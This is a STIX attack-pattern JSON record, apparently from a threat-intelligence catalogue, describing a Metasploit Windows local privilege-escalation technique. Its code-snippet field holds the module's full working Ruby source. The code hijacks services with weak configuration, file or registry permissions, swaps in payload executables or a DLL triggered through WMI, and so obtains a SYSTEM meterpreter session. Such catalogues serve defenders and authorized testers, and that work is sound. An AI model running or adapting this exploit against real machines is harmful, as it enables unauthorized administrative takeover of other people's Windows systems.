{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--42afd26f-38b8-42ef-9783-3423243fd17f",
    "created": "2024-08-14T16:48:57.218372Z",
    "modified": "2024-08-14T16:48:57.218376Z",
    "name": "Windows Escalate Service Permissions Local Privilege Escalation",
    "description": " This module attempts to exploit existing administrative privileges to obtain a SYSTEM session. If directly creating a service fails, this module will inspect existing services to look for insecure configuration, file or registry permissions that may be hijacked. It will then attempt to restart the replaced service to run the payload. This will result in a new session when this succeeds.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/service_permissions.rb",
            "external_id": "service_permissions.rb"
        },
        {
            "source_name": "reference",
            "url": "https://itm4n.github.io/windows-registry-rpceptmapper-eop/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Services\n  include Msf::Post::Windows::Accounts\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::WMIC\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  ERROR = Msf::Post::Windows::Error\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate Service Permissions Local Privilege Escalation',\n        'Description' => %q{\n          This module attempts to exploit existing administrative privileges to obtain\n          a SYSTEM session. If directly creating a service fails, this module will inspect\n          existing services to look for insecure configuration, file or registry permissions that may\n          be hijacked. It will then attempt to restart the replaced service to run the\n          payload. This will result in a new session when this succeeds.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'scriptjunkie', # service and file permission techniques\n          'Spencer McIntyre', # registry permission technique\n          'itm4n' # registry permission technique\n        ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'DefaultOptions' =>\n          {\n            'EXITFUNC' => 'thread',\n            'WfsDelay' => '5'\n          },\n        'Targets' =>\n          [\n            [ 'Automatic', {} ],\n          ],\n        'References' => [\n          ['URL', 'https://itm4n.github.io/windows-registry-rpceptmapper-eop/']\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-10-15'\n      )\n    )\n\n    register_options([\n      OptBool.new('AGGRESSIVE', [ false, 'Exploit as many services as possible (dangerous)', false ])\n    ])\n    register_advanced_options([\n      OptString.new('TargetServiceName', [ false, 'The name of a specific service to target', false ])\n    ])\n    deregister_options('RHOST', 'SMBUser', 'SMBPass', 'SMBDomain')\n  end\n\n  def execute_payload_as_new_service(path)\n    success = false\n\n    print_status('Trying to add a new service...')\n    service_name = Rex::Text.rand_text_alpha((rand(6..13)))\n    if service_create(service_name, { path: path, display: '' }) == ERROR::SUCCESS\n      print_status(\"Created service... #{service_name}\")\n      write_exe(path, service_name)\n      if service_start(service_name) == ERROR::SUCCESS\n        print_good('Service should be started! Enjoy your new SYSTEM meterpreter session.')\n        success = true\n      end\n\n      service_delete(service_name)\n    else\n      print_status('No privileges to create a service...')\n      success = false\n    end\n\n    return success\n  end\n\n  def weak_service_permissions(service_name, service, path)\n    success = false\n    vprint_status(\"[#{service_name}] Checking for weak service permissions\")\n\n    if (service_change_config(service_name, { path: path }) == ERROR::SUCCESS)\n      print_good(\"[#{service_name}]  has weak configuration permissions - reconfigured to use exe #{path}\")\n      print_status(\"[#{service_name}] Restarting service\")\n      res = service_stop(service_name)\n\n      if ((res == ERROR::SUCCESS) || (res == ERROR::SERVICE_NOT_ACTIVE))\n        write_exe(path, service_name)\n        if service_restart(service_name)\n          print_good(\"[#{service_name}] Service restarted\")\n          success = true\n        else\n          print_error(\"[#{service_name}] Unable to restart service\")\n        end\n      end\n\n      unless (service_change_config(service_name, { path: service[:path] }) == ERROR::SUCCESS)\n        print_error(\"[#{service_name}] Failed to reset service to original path #{service[:path]}\")\n      end\n    end\n\n    return success\n  end\n\n  def weak_file_permissions(service_name, service, _path, token)\n    success = false\n    vprint_status(\"[#{service_name}] Checking for weak file permissions\")\n\n    # get path to exe; parse out quotes and arguments\n    original_path = service[:path]\n    possible_path = expand_path(original_path)\n    if (possible_path[0] == '\"')\n      possible_path = possible_path.split('\"')[1]\n    else\n      possible_path = possible_path.split(' ')[0]\n    end\n\n    unless file?(possible_path)\n      # If we can't determine it manually show the user and let them decide if manual inspection is worthwhile\n      print_status(\"[#{service_name}] Cannot reliably determine path: #{possible_path}\")\n    end\n\n    file_permissions = check_dir_perms(possible_path, token)\n\n    if file_permissions && file_permissions.index('W')\n      print_good(\"[#{service_name}] Write access to #{possible_path}\")\n\n      begin\n        status = service_status(service_name)\n        no_access = false\n        # Unless service is already stopped\n        if status[:state] == SERVICE_STOPPED\n          stopped = true\n        else\n          res = service_stop(service_name)\n          stopped = ((res == ERROR::SUCCESS) || (res == ERROR::SERVICE_NOT_ACTIVE))\n        end\n      rescue RuntimeError => e\n        vprint_error(\"[#{service_name}] #{e} \")\n        no_access = true\n      end\n\n      if stopped || no_access\n        begin\n          if move_file(possible_path, \"#{possible_path}.bak\")\n            write_exe(possible_path, service_name)\n            print_status(\"[#{service_name}] #{possible_path} moved to #{possible_path}.bak and replaced.\")\n            if service_restart(service_name) # rubocop:disable Metrics/BlockNesting\n              print_good(\"[#{service_name}] Service restarted\")\n              success = true\n            else\n              print_error(\"[#{service_name}] Unable to restart service\")\n            end\n          end\n        rescue Rex::Post::Meterpreter::RequestError => e\n          vprint_error(\"[#{service_name}] #{e}\")\n        end\n      else\n        vprint_error(\"[#{service_name}] Unable to stop service\")\n      end\n    end\n\n    return success\n  end\n\n  def weak_registry_permissions(service_name)\n    # check the system and payload architectures are compatible, otherwise this technique won't work\n    return false if sysinfo['Architecture'] != payload_arch\n\n    vprint_status(\"[#{service_name}] Checking for weak registry permissions\")\n    backup = nil\n\n    reg_key = \"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\#{service_name}\\\\Performance\"\n    if registry_enumvals(reg_key).nil?\n      return false unless registry_createkey(reg_key)\n\n      print_good(\"[#{service_name}] Created registry key: #{reg_key}\")\n    else\n      backup = {}\n      # backup values to restore later\n      %w[Library Open Collect Close].each do |value|\n        backup[value] = registry_getvaldata(reg_key, value)\n      end\n    end\n\n    envs = get_envs('TEMP')\n\n    dll_path = \"#{envs['TEMP']}\\\\#{Rex::Text.rand_text_alpha(8)}.dll\"\n    vprint_status(\"[#{service_name}] Writing payload DLL to #{dll_path}\")\n    write_file(dll_path, generate_payload_dll)\n    register_files_for_cleanup(dll_path)\n\n    success = true\n    success &&= registry_setvaldata(reg_key, 'Library', dll_path, 'REG_SZ')\n    success &&= registry_setvaldata(reg_key, 'Open', 'OpenPerfData', 'REG_SZ')\n    success &&= registry_setvaldata(reg_key, 'Collect', 'CollectPerfData', 'REG_SZ')\n    success &&= registry_setvaldata(reg_key, 'Close', 'ClosePerfData', 'REG_SZ')\n\n    # don't use session_count to accurately account for AGGRESSIVE mode\n    session_count = self.session_count\n    if success\n      vprint_status(\"[#{service_name}] Triggering the payload via WMI...\")\n      wmic_query('Path Win32_Perf Get', server = 'localhost') # rubocop:disable Lint/UselessAssignment\n    end\n\n    if backup.nil?\n      registry_deletekey(reg_key)\n    else\n      backup.each_pair do |value, data|\n        if data.nil?\n          registry_deleteval(reg_key, value)\n        else\n          registry_setvaldata(reg_key, value, data, 'REG_SZ')\n        end\n      end\n    end\n\n    return false unless success\n\n    # reuse the WMI command timeout since execution is dependent on the WMI command trigger\n    0.upto(datastore['TIMEOUT']) do |_|\n      sleep(1)\n      break if self.session_count > session_count\n    end\n\n    self.session_count > session_count\n  end\n\n  # If ServiceType is SERVICE_WIN32_SHARE_PROCESS then we need to\n  # define the correct servicename.\n  def write_exe(path, service_name = nil)\n    vprint_status(\"[#{service_name}] Writing service executable to #{path}\")\n    exe = generate_payload_exe_service({ servicename: service_name, arch: payload_arch })\n    write_file(path, exe)\n    register_files_for_cleanup(path)\n  end\n\n  def payload_arch\n    if payload.arch.include?(ARCH_X64)\n      return ARCH_X64\n    else\n      return ARCH_X86\n    end\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] != payload_arch\n      print_error('The registry technique will be skipped because the payload architecture does not match the native system architecture')\n    end\n    tempexe_name = \"#{Rex::Text.rand_text_alpha(rand(6..13))}.exe\"\n\n    dir_env = get_envs('SystemRoot', 'TEMP')\n    tmpdir = dir_env['TEMP']\n    tempexe = \"#{tmpdir}\\\\#{tempexe_name}\"\n\n    if datastore['TargetServiceName'].blank?\n      begin\n        return if execute_payload_as_new_service(tempexe)\n      rescue RuntimeError => e\n        vprint_status(\"Unable to create a new service: #{e}\")\n      end\n    end\n\n    aggressive = datastore['AGGRESSIVE']\n\n    print_status('Trying to find weak permissions in existing services..')\n\n    token = get_imperstoken\n    each_service do |serv|\n      service_name = serv[:name]\n      next unless (datastore['TargetServiceName'].blank? || datastore['TargetServiceName'].downcase == service_name.downcase)\n\n      service = service_info(service_name)\n\n      begin\n        return if weak_file_permissions(service_name, service, tempexe, token) && !aggressive\n      rescue RuntimeError => e\n        vprint_status(\"[#{serv[:name]}] #{e}\")\n      end\n\n      begin\n        return if weak_service_permissions(service_name, service, tempexe) && !aggressive\n      rescue RuntimeError => e\n        vprint_status(\"[#{serv[:name]}] #{e}\")\n      end\n\n      begin\n        return if weak_registry_permissions(service_name) && !aggressive\n      rescue RuntimeError => e\n        vprint_status(\"[#{serv[:name]}] #{e}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-15",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}